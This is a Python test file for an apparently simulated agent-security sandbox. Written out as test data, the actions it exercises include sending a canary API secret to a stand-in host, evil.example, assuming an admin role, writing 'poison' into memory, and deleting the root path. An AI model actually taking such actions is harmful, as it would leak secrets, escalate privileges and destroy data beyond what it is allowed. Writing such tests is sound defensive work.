from agent_security_arena.models import ProposedAction
from agent_security_arena.tools import SimulatedToolSandbox, ToolContext


def test_secret_and_network_tools_remain_simulated() -> None:
    sandbox = SimulatedToolSandbox()
    context = ToolContext(canaries={"api": "CANARY_123"}, sources={})

    secret = sandbox.execute(ProposedAction(tool="secrets.read", arguments={"key": "api"}), context)
    outbound = sandbox.execute(
        ProposedAction(
            tool="network.post",
            arguments={"url": "https://evil.example", "include_secret": "api"},
        ),
        context,
    )

    assert secret.result == {"key": "api", "value": "CANARY_123"}
    assert outbound.result["simulated"] is True
    assert outbound.result["payload"]["secret"] == "CANARY_123"


def test_role_and_memory_change_only_in_memory_context() -> None:
    sandbox = SimulatedToolSandbox()
    context = ToolContext(canaries={}, sources={})

    sandbox.execute(
        ProposedAction(tool="identity.assume_role", arguments={"role": "admin"}), context
    )
    sandbox.execute(
        ProposedAction(tool="memory.write", arguments={"key": "rule", "value": "poison"}), context
    )

    assert context.role == "admin"
    assert context.memory == {"rule": "poison"}


def test_unknown_tool_is_denied() -> None:
    call = SimulatedToolSandbox().execute(
        ProposedAction(tool="filesystem.delete", arguments={"path": "/"}),
        ToolContext(canaries={}, sources={}),
    )

    assert call.status == "denied"
    assert "unknown" in call.result["error"]
